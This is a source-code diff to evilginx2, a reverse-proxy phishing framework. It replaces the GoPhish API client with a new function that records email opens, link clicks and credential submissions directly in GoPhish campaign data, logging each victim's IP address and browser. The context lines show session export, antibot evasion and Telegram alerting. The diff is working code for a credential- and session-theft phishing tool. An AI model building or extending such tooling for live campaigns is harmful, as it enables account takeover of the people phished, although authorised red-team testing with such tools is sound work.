@@ -47,6 +47,7 @@ import (
 	"github.com/kgretzky/evilginx2/core/antibot/signals"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	gp_models "github.com/kgretzky/evilginx2/gophish/models"
 )
 
 const (
@@ -75,7 +76,6 @@ type HttpProxy struct {
 	db       *database.Database
 	bl       *Blacklist
 	wl       *Whitelist
-	gophish  *GoPhish
 	telegram *TelegramBot
 
 	antibotEngine     *antibot.AntibotEngine
@@ -130,7 +130,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		db:       db,
 		bl:       bl,
 		wl:       wl,
-		gophish:  NewGoPhish(),
 		telegram: NewTelegramBot(),
 
 		antibotEngine:     nil, // Will be initialized
@@ -576,20 +575,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									// set params from url arguments
 									p.extractParams(session, req.URL)
 
-									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-										if trackParam, ok := session.Params["o"]; ok {
-											if trackParam == "track" {
-												// gophish email tracker image
-												rid, ok := session.Params["rid"]
-												if ok && rid != "" {
-													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
-													if err != nil {
-														log.Error("gophish: %s", err)
-													}
-													return p.trackerImage(req)
-												}
+									if trackParam, ok := session.Params["o"]; ok {
+										if trackParam == "track" {
+											// gophish email tracker image
+											rid, ok := session.Params["rid"]
+											if ok && rid != "" {
+												log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+												recordGophishEvent(rid, remote_addr, req.Header.Get("User-Agent"), "open")
+												return p.trackerImage(req)
 											}
 										}
 									}
@@ -607,15 +600,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.sids[session.Id] = sid
 									p.session_mtx.Unlock()
 
-									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-										rid, ok := session.Params["rid"]
-										if ok && rid != "" {
-											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
-											if err != nil {
-												log.Error("gophish: %s", err)
-											}
-										}
+									rid, ok := session.Params["rid"]
+									if ok && rid != "" {
+										recordGophishEvent(rid, remote_addr, req.Header.Get("User-Agent"), "click")
 									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
@@ -1318,15 +1305,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							p.AutoExportAndSendSession(sessionID, ps.SessionId)
 						}
 
-						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-							rid, ok := s.Params["rid"]
-							if ok && rid != "" {
-								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
-								if err != nil {
-									log.Error("gophish: %s", err)
-								}
-							}
+						rid, ok := s.Params["rid"]
+						if ok && rid != "" {
+							recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit")
 						}
 					}
 				}
@@ -1505,15 +1486,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-								rid, ok := s.Params["rid"]
-								if ok && rid != "" {
-									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
-									if err != nil {
-										log.Error("gophish: %s", err)
-									}
-								}
+							rid, ok := s.Params["rid"]
+							if ok && rid != "" {
+								recordGophishEvent(rid, s.RemoteAddr, s.UserAgent, "submit")
 							}
 							break
 						}
@@ -2640,4 +2615,34 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+func recordGophishEvent(rid string, ip string, userAgent string, eventType string) {
+	id := strings.TrimSuffix(rid, "+") // TransparencySuffix
+	rs, err := gp_models.GetResult(id)
+	if err != nil {
+		return
+	}
+	c, err := gp_models.GetCampaign(rs.CampaignId, rs.UserId)
+	if err != nil || c.Status == gp_models.CampaignComplete {
+		return
+	}
+	rs.UpdateGeo(ip)
+	
+	d := gp_models.EventDetails{
+		Payload: nil,
+		Browser: map[string]string{
+			"address": ip,
+			"user-agent": userAgent,
+		},
+	}
+
+	switch eventType {
+	case "open":
+		rs.HandleEmailOpened(d)
+	case "click":
+		rs.HandleClickedLink(d)
+	case "submit":
+		rs.HandleFormSubmit(d)
+	}
 }
